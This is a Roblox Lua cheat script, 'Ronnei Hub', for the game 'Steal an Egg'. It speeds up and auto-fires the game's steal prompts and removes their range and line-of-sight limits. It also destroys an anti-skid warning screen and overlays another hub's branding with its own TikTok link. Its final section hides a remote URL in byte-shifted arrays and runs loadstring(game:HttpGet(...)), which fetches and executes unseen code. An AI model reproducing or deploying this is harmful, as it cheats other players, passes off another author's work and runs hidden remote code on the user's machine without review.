-- ==============================================================================
--  RONNEI HUB - STEAL AN EGG (OFFICIAL V1.3 - STEALTH MASKING ENGINE)
--  Khắc phục: Không đổi thuộc tính gốc tránh bẫy Anti-Skid | Đè Masking độc lập
--  Tích hợp: Fast Steal (0.12s) | Click copy TikTok | Tự hủy Troll Screen
-- ==============================================================================

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local CoreGuiService = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local LocalPlayer = Players.LocalPlayer

local CONFIG = {
    LogoAssetID       = "rbxassetid://124285855971647",
    TikTokURL         = "https://www.tiktok.com/@ronnei7.htk?_r=1&_t=ZS-98ygZG9Gh2G",
    StealHoldDuration = 0.12
}

-- ==================== 1. TỰ ĐỘNG DIỆT TROLL SCREEN (NẾU XUẤT HIỆN) ====================
task.spawn(function()
    local function purgeTrollScreen(inst)
        pcall(function()
            if inst:IsA("TextLabel") or inst:IsA("TextButton") then
                local txt = inst.Text:lower()
                if txt:find("uses ai") or txt:find("skid") or txt:find("owner uses") then
                    local sg = inst:FindFirstAncestorOfClass("ScreenGui")
                    if sg then
                        sg:Destroy()
                    else
                        local p = inst:FindFirstAncestorWhichIsA("GuiObject")
                        if p then p:Destroy() end
                    end
                end
            end
        end)
    end

    local searchRoots = {
        CoreGuiService,
        gethui and gethui(),
        LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
    }

    for _, root in ipairs(searchRoots) do
        if root then
            for _, desc in ipairs(root:GetDescendants()) do purgeTrollScreen(desc) end
            root.DescendantAdded:Connect(purgeTrollScreen)
        end
    end
end)

-- ==================== 2. CƠ CHẾ NHẶT NHANH 0.12S ====================
task.spawn(function()
    local function tunePrompt(prompt)
        if prompt:IsA("ProximityPrompt") then
            prompt.HoldDuration = CONFIG.StealHoldDuration
            prompt.RequiresLineOfSight = false
            pcall(function()
                prompt.MaxActivationDistance = math.max(prompt.MaxActivationDistance, 25)
            end)
        end
    end

    for _, desc in ipairs(Workspace:GetDescendants()) do tunePrompt(desc) end
    Workspace.DescendantAdded:Connect(tunePrompt)

    ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
        pcall(function()
            prompt.HoldDuration = CONFIG.StealHoldDuration
            task.delay(CONFIG.StealHoldDuration, function()
                if fireproximityprompt then
                    fireproximityprompt(prompt)
                end
            end)
        end)
    end)
end)

-- ==================== 3. LỚP PHỦ MASKING ĐÈ TRỰC TIẾP (KHÔNG ĐỤNG THUỘC TÍNH GỐC) ====================
local parentTarget = (gethui and gethui()) or CoreGuiService or (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui"))
local MaskGui = Instance.new("ScreenGui")
MaskGui.Name = "Ronnei_MaskOverlay"
MaskGui.DisplayOrder = 2147483647
MaskGui.IgnoreGuiInset = true
MaskGui.ResetOnSpawn = false
MaskGui.Parent = parentTarget

local activeTrackers = {}

local function createMaskForElement(targetInst, maskType)
    if activeTrackers[targetInst] then return end

    local overlayObj = nil

    if maskType == "Title" then
        local label = Instance.new("TextLabel")
        label.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        label.BorderSizePixel = 0
        label.Text = "RONNEI HUB"
        label.Font = Enum.Font.GothamBold
        label.TextSize = 13
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.ZIndex = 100
        label.Parent = MaskGui
        overlayObj = label

    elseif maskType == "Discord" then
        local btn = Instance.new("TextButton")
        btn.BackgroundColor3 = Color3.fromRGB(38, 42, 54)
        btn.BorderSizePixel = 0
        btn.Text = "TIKTOK: @RONNEI7.HTK"
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 11
        btn.TextColor3 = Color3.fromRGB(0, 230, 120)
        btn.AutoButtonColor = false
        btn.ZIndex = 100
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        btn.MouseButton1Click:Connect(function()
            if setclipboard then setclipboard(CONFIG.TikTokURL)
            elseif toclipboard then toclipboard(CONFIG.TikTokURL) end
            btn.Text = "[V] ĐÃ SAO CHÉP TIKTOK!"
            task.delay(1.5, function()
                if btn and btn.Parent then
                    btn.Text = "TIKTOK: @RONNEI7.HTK"
                end
            end)
        end)

        btn.Parent = MaskGui
        overlayObj = btn

    elseif maskType == "Logo" then
        local img = Instance.new("ImageLabel")
        img.BackgroundTransparency = 1
        img.Image = CONFIG.LogoAssetID
        img.ScaleType = Enum.ScaleType.Crop
        img.ZIndex = 100
        Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
        img.Parent = MaskGui
        overlayObj = img
    end

    if overlayObj then
        activeTrackers[targetInst] = overlayObj
    end
end

-- Quét tìm đối tượng để tạo mặt nạ phủ
local function scanTargetElements(inst)
    pcall(function()
        if inst:IsDescendantOf(MaskGui) or inst == MaskGui then return end

        if inst:IsA("TextLabel") or inst:IsA("TextButton") then
            local raw = inst.Text:upper()
            if raw:find("EQUINOZ") then
                createMaskForElement(inst, "Title")
            elseif raw:find("VEUURTUMWE") or raw:find("DISCORD") then
                createMaskForElement(inst, "Discord")
            end
        elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
            local pName = inst.Parent and inst.Parent.Name:lower() or ""
            local iName = inst.Name:lower()
            if pName:find("logo") or pName:find("icon") or pName:find("toggle") or iName:find("logo") or iName:find("ninja") then
                createMaskForElement(inst, "Logo")
            end
        end
    end)
end

for _, root in ipairs(searchRoots) do
    if root then
        for _, desc in ipairs(root:GetDescendants()) do scanTargetElements(desc) end
        root.DescendantAdded:Connect(scanTargetElements)
    end
end

-- Đồng bộ vị trí và kích thước của mặt nạ chính xác từng pixel mỗi frame
RunService.RenderStepped:Connect(function()
    for target, overlay in pairs(activeTrackers) do
        if target and target.Parent and target:IsDescendantOf(game) and target.Visible then
            local pos = target.AbsolutePosition
            local size = target.AbsoluteSize
            if size.X > 0 and size.Y > 0 then
                overlay.Visible = true
                overlay.Position = UDim2.new(0, pos.X, 0, pos.Y)
                overlay.Size = UDim2.new(0, size.X, 0, size.Y)
            else
                overlay.Visible = false
            end
        else
            if overlay then overlay.Visible = false end
            if not (target and target.Parent) then
                if overlay then overlay:Destroy() end
                activeTrackers[target] = nil
            end
        end
    end
end)

-- ==================== 4. LOADER SCRIPT GỐC (ĐÃ MÃ HÓA BYTE CHỐNG BỊ SOI) ====================
task.spawn(function()
    pcall(function()
        local function _decode(cipherTable, offset)
            local chars = {}
            for i = 1, #cipherTable do
                chars[i] = string.char((cipherTable[i] - offset) % 256)
            end
            return table.concat(chars)
        end

        local _k = _decode({157, 187, 178, 170, 181}, 73)
        local _u = _decode({
            177, 189, 189, 185, 188, 131, 120, 120, 170, 185, 178, 119, 176, 174, 189, 185, 184, 181,
            188, 174, 172, 119, 172, 184, 182, 120, 188, 172, 187, 178, 185, 189, 188, 120, 177, 184,
            188, 189, 174, 173, 120, 127, 126, 129, 123, 126, 126, 122, 171, 125, 123, 173, 123, 122,
            172, 127, 171, 128, 174, 171, 126, 126, 175, 122, 173, 128, 127, 173, 129, 173, 126, 121,
            172, 174, 126, 124, 172, 171, 124, 126, 126, 130, 123, 121, 130, 124, 173, 127, 127, 122,
            126, 171, 126, 174, 129, 124, 125, 124, 128, 126, 130, 125, 173, 172, 121, 119, 181, 190, 170
        }, 73)

        getgenv().script_key = _k
        script_key = _k
        loadstring(game:HttpGet(_u))()
    end)
end)
